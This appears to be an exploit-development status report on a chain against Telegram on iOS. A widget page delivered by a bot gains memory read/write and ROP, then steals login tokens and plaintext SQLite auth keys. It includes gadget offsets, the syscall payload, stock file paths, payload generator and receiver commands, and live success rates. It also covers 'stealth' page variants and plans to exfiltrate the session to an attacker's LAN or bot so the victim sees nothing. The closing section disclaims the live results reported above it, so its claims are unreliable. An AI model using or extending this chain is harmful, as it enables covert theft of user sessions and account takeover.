# iOS 27 17e — session impact stage (2026-11-09)

Status: **live full DB/auth-key chain via the F4 net page (msg 17128):
tokens + 1 MiB DB with SQLite header_ok + 3 verified auth keys; the complete
`t1` blob needs the overflow window. No rate claim yet.**

> **Current install check (2026-11-09 17:50).** The 17e was reinstalled; the
> main app `ph.telegra.Telegraph` now has container
> `F6341184-862D-4832-9FFE-C56F46A96BB2` and AppGroup
> **`F613329B-CD25-4259-B6F6-70C8F0E6D62F`**, not the `8687B83B…` used when the
> v14 pages were generated. Regenerate before the live session run:
> `gen_session_payload.py --group F613329B-CD25-4259-B6F6-70C8F0E6D62F
> --account <current> --mode net|file …`. `login-tokens` is account-independent;
> the Postbox path needs the current account dir (find it with `backup2` or a
> group listing). This is build time, not exploit time.

## Live full DB/auth-key chain (2026-11-10 00:03)

The F4 net page superseded the v10/v14 stage-A route for the live run:

- `f4sf_net_1m.html` (7,554 B / zlib9 3,171, sha
  `dd1c3b5fb0afcdfbd4a7ad262d1d07f74c7b1a23569123e9631bba49d8ef30e1`),
  msg **17128** in the clean chat via the stock bot `sendWidget`.
- `GOT 1052672 bytes` from `192.168.1.125:61134`: 4,096 B tokens +
  1,048,576 B DB window; capture sha `08379f2e…`; `dt_accept 0.250 s`,
  `dt_done 0.288 s` (single run; app PID 839 alive).
- `sqlite` **header_ok**: page_size 4,096, page_count 7,891, file_size
  32,321,536. The `t1` persistent auth row is present: 2,470/6,599 B,
  **3 verified auth keys**; the remaining 4,129 B are in overflow page
  5,365 at file offset **21,970,944**, so a second 1 MiB window at that
  offset (`--db2`) is the next read.
- No Frida/root; USB was used only for navigation and the Local Network
  permission. The complete `t1` blob is the remaining chain link; the
  token + DB-header + 3-key chain is live.
- **DB2 page (live 2/3):** `f4sf_net_db2.html` raw 7,986 / zlib9 3,300,
  sha `230eba15…`; `pread` 1 MiB at the **current** overflow offset (live
  5,410,816 = page 1322; the stale 21,970,944 is wrong), `base+0x6909508`,
  import 7401; receiver `--toklen 0 --dblen 0x100000 --dboff <off>`;
  `parse_db2.py` assembles the complete `t1` payload (6,663 B / blob 6,626,
  not the older 6,599). Same-engine db2 after the first window → **10/10
  official selectors/keys** (attempt 2); reverse/relaunch drift
  31,158,272 → invalid archived blob. First-window 3-key 3/3,
  payload_complete 3/3, strict complete-t1 **2/3**, official **1/3**. Best
  workflow: first-window then db2 in the same engine; if a relaunch is
  required, re-read the offset and rebuild.
- **Full-chain N=10 (current page `cbb270b2…`):** **chain execution 10/10**
  (1,052,672 B, 12-token JSON, `sqlite header_ok`, 0 transport/header/token
  failures); **strict 3-key 5/10 = 50%**, 95% one-sided lower bound
  **0.2224** (the 5 had 2 keys, partial `t1` 2,286/6,415 or 2,470/6,599 B;
  the DB/overflow offset moved as the file grew). Timing (all 10):
  `dt_accept` mean 0.268 / median 0.252 s; `dt_done` mean 0.312 / median
  0.300 s; 3 harness/navigation exclusions (17136/17138/17141) are not
  chain failures. The DB2 page at the current overflow offset stabilizes the
  3-key gate.
- **Stealth final pages (2026-11-10):** `f4sf_net_tok_stealth.html`
  7,125/2,982 sha `8bf00f58…`; `f4sf_net_1m_stealth.html` 7,246/3,023 sha
  `9f4507c2…`; `f4sf_net_db2_stealth.html` 7,247/3,024 sha `61308c19…`.
  No F4SF/console/debug text, hidden `#v`, benign 1×1 transparent body,
  silent errors, arm deferred 300 ms after the benign frame; frame/ROP
  identity and emulator PASS. The DB2 page must be rebuilt at the current
  overflow offset per attempt. The stealth N=10 is the final metric
  (session + app alive + no visible artifact); debug rates are not.
- **Stealth attempt 1 (2026-11-10):** first-window msg 17156: 1,052,672 B,
  12 tokens, SQLite header_ok, `t1` partial 2,222/6,? B at offset 5,001,216,
  **2 verified keys**; first `dt_accept` 0.646 s / `dt_done` 0.687 s; app
  PID 1006 alive; `st_vis.png` no F4SF/debug — visibility passes. DB2
  same-engine msg 17157 no capture (the first-window ARM stops the widget
  thread; back/reopen failed); DB2 fresh-engine msg 17158 no capture
  (foreground/offset drift). **The same-engine first+DB2 premise is
  disproven**; the first-window session (tokens+DB+2 keys) is the repeatable
  user-metric unit, and the full 3-key/`t1` needs a page/chain change.
  **First-window stealth N=10 (2026-11-10): 10/10**, 95% one-sided lower
  **0.741**; mean/median `dt_accept` **0.5603 / 0.5639 s**, `dt_done`
  **0.6016 / 0.6026 s**; app crashes **0**; visibility failures **0**; every
  session 1,052,672 B, 12 tokens, SQLite header_ok, ≥2 keys. Page drift:
  attempts 1–7 `9f4507c2…`, 8–10 `a392c1a7…`; two old `TGW OK` test widgets
  remain in the chat history (the 10 run screenshots have no
  F4SF/RESULT/READY/BAD; purge for a whole-chat check). 3 NO_CAP USB
  transport drops are host-recovery exclusions.
- **Single-page multi-window (live 1/1):** base `f4sf_net_multi_stealth.html`
  7,623/3,097 sha `5157e1c0…`; **one widget, one native chain**: tokens +
  first 1 MiB @0 + overflow 1 MiB @DBOFF = 2,101,248 B; no second
  page/session. Corrected offset **18,182,144**, page sha `8696e11e…`, msg
  17171: `t1 complete=True`, payload 6,847 / blob 6,810, **10/10 official
  selectors/keys**, app PID 1137 alive, no forbidden text. The offset drifts
  (history 21,970,944 → 5,001,216 → 5,410,816 → 31,158,272 → 32,186,368 →
  21,209,088 → 18,182,144); re-read from the same engine generation before
  every multi build. Full 3-key **1/1**; first-window N=10 is the session
  metric. The whole-DB 32 MiB unroll is not delivered (16,440-B frame >
  4,096).

## Bot-return exfiltration (stealth idea, documented 2026-11-10)

The current PoC returns the session over a **native TCP socket to the
attacker LAN**. On a fresh iOS install the first private-address connect
triggers the **Local Network permission alert** (the “Consenti” prompt); the
lab hides it only because the permission was already granted. For a PoC that
is acceptable, but it is a visible artifact. The stealth direction is to
return through Telegram, using the same bot that delivered the widget.

- **Option A — official widget request/answer channel.** The page calls
  `TelegramWidget.request(data)`; request `data` is **1–64 UTF-8 bytes**, the
  bot receives it as `widget_query.data`, and the answer `data` is
  **0–1,024 B** (bot→widget). Client pacing is 1 request/5 s in the
  background (taps are immediate), server flood 5/5 s; NUL is rejected. This
  fits the **small session data**: the 12 login tokens are ~328 B → ~6
  requests (~30 s), plus a few auth-key bytes. The 1 MiB DB is not practical
  here (≈16,384 requests). No LAN prompt; the traffic is the app’s normal
  Telegram HTTPS.
- **Option B — direct Bot API from the page/native.** If the widget page’s
  network API exposes HTTPS (or the native chain can call the app’s
  CFNetwork/NSURLSession), the page/native can POST the session as a
  **document** to the attacker’s bot chat via `sendDocument` (Bot API
  document limit 50 MB; the 1 MiB DB fits). The bot token is embedded in the
  page/native; the victim sees only the benign widget; no LAN prompt. This
  needs either a **return-to-JS/JS-visible buffer** (the current F4 ROP
  `pthread_exit`s and the page JS never sees the file bytes) or a native
  HTTPS chain; **not implemented yet**.
- **Option C — same bot for delivery and return.** The bot that sent the
  `sendWidget` page can also receive the request data / document in the
  attacker’s chat (`getUpdates`, `answerWidgetQuery`/`sendDocument`); the
  victim only sees the widget bubble.

Trade-offs: Option A is stock and simple but small/paced; Option B carries
the DB but needs page/native HTTPS and the token; the current LAN socket is
the working PoC. The recommended stealth final is Option A for the
**tokens/auth material** and the native LAN only for the full DB, or Option
B once the return-to-JS/CFNetwork chain exists. Android has the equivalent:
the app-side Java `app_process` stealer (UID 10346) can POST the session
files to the Bot API with `HttpsURLConnection`/`sendDocument`, avoiding the
LAN socket; the widget delivery is already the bot.

## What it does

The proven parser stage A is kept byte-for-byte; the stage-B front
(class-24 view anchor → arbitrary R/W → `JSRuntime` → Mach-O base →
Mach-O/GOT resolution) is kept; only the final ROP payload is replaced.

Net payload:
`socket → STORE(fd) → mmap(0x300000000, LEN, 3, 0x1012, -1, 0) → connect →
open(login-tokens) → read → write → open(postbox/db/db_sqlite) → read → write
→ close → pthread_exit`.

All calls use the app's own `__got` (no libc deltas except the pivot); a new
`str x0,[x22,#0x28]; ret` gadget at `base+0x38baecc` keeps dynamically
returned fds without `dup2`/`fcntl`.

File fallback: same front, writes the 1 MiB DB window to
`AppGroup/<APPGROUP>/spdb`, retrievable with `backup2` — the same channel
that proved the current group-root write.

Wire format: `[4096 B login-tokens][LEN B Postbox window]`; LEN = 1 MiB probe
or 64 MiB full DB.

## Exact stock paths

- `AppGroup/<APPGROUP>/telegram-data/account-<ACCOUNT_ID>/postbox/db/db_sqlite`
  — plaintext SQLite; auth keys in `t1.persistent:datacenterAuthInfoById`.
- `AppGroup/<APPGROUP>/telegram-data/accounts-metadata/login-tokens`.

No keychain/entitlement wall was found. A Telegram passcode would make the
Postbox DB SQLCipher ciphertext (the one encryption wall).

## Payloads

| payload | sha256 | raw | zlib9 |
|---|---|---:|---:|
| `session_v10_net_1m.html` | `63c8c56abc7df326901637096d2aa6b89c482baeda2cd697986a6bcf03c20fcb` | 9,218 | 3,839 |
| `session_v10_net_64m.html` | `2b05907fbb0468f7acdddcec4d070fda83f16db079fa17f0dc53749dd203b971` | 9,219 | 3,840 |
| `session_v10_file_1m.html` | `c1ef9bb608a5cc8d44ad7da3d8c2ef60a8df185f5415b1e8ec5a0bcf9ce34815` | 9,136 | 3,803 |
| `session_v0_net_1m.html` | `e2ede36b4cee0aaa935628e347cd84f13ae0eec2d5869b684db8ae259dec488f` | 9,218 | 3,855 |

S2 full hashes and frame/data hashes: `REPORT.md` §8 and
`evidence/host_validation.txt`.

## Host validation (4 PASS)

- Stage A unchanged outside the S2 span; tiny_emu forges (v10 `HIT=585`,
  v0 `HIT=545`).
- Minified `BC` builds byte-identical frame/data to the source builder.
- ROP emulator validates the exact gadget protocol, `STORE` fd propagation,
  0644 file creation, SQLite/login-token bytes.
- Static checks in the 13.2 binary (`G_CALL 0x3292c`, `G_LOAD 0x172d96c`,
  `G_X0 0x628a2c`, `STORE 0x38baecc`); pivot `free+0xB6583074`.
- Parser on the iOS 27 1 MiB window: t1 page + 4 verified auth keys from the
  2,783-B local part.

## v14 session payloads (current group/account)

The v14 front end has been combined with the session S2, built with the
current AppGroup/account; the all-zero UUID is absent:

| payload | sha256 | raw | zlib9 |
|---|---|---:|---:|
| `session_v14_net_1m.html` | `a8cbef6fff6bc0f69370d32efef4b42fcd3f2f1dd06341289e236acd19c51cf2` | 9,218 | 3,853 |
| `session_v14_net_64m.html` | `07cb967a2aa5d8d9da58a9a5b4f691db24d2abaab4c3754b7cd20fbb66873219` | 9,219 | 3,855 |
| `session_v14_file_1m.html` | `8d8064cc630b865ec65175c0678f240207999051655233342cfba8e976a0e160` | 9,136 | 3,820 |

Host validation 5/5: stage A unchanged outside S2; tiny_emu forges in
asc/desc/rand layouts (`HIT=585`/`545`); minified S2 byte-identical; ROP
emulator passes net/file; parser finds t1 + keys in the 1 MiB window.

**Important:** the plain v14 stage-A page in `fix_v10/out/` still carries the
stock zero-UUID S2. Use it only for the stage-A hit-rate marker; use
`session_v14_file_1m`/`net_1m` for the current-group session proof
(`spdb` or `GOT`), not the old `rce.txt` path.

## Correction: p0's stale AppGroup

The 5725/p0 page hardcodes the **all-zero AppGroup UUID**, so it cannot have
written the `rce.txt` in the current `<APPGROUP>` group. That file proves the
group-root write of the payload family that carries the current UUID, not
p0's S2. The final session payload must use the current group/account
(`--group/--account`); a v14 session payload is being generated.

## Live test

1. Rebuild with the host LAN IP:
   `gen/gen_session_payload.py --base v10 --mode net --ip <LAN_IP> --port 4453
   --dblen 0x100000 --out out/session_v10_net_1m.html`.
2. `tools/c2_recv.py --port 4453 --out /tmp/opencode/sess_cap.bin --dblen
   0x100000 --parse`.
3. Clean chat, launch with `--console`, payload last, phone unlocked; expect
   `GOT 1052672 bytes`, then `t1` + verified `authKeyId`.
4. No LAN: `session_v10_file_1m.html` + `backup2 --only-regex
   '<APPGROUP>.*spdb'`.

## Walls

- **Current live blocker is stage A**, not the session read: 0/20 forges on
  2026-11-09, 9/20 app death at parse time. The v14 varying-pad page is the
  front-end fix; a v14 session payload is pending.
- Endgame is host-validated only; `MAP_FIXED 0x300000000`, the 4096 trigger
  class, GOT values and large `write` remain device-unproven.
- AppGroup/account are per-install; regenerate with `--group/--account`.

No live session read, no reliability/speed number is claimed here.
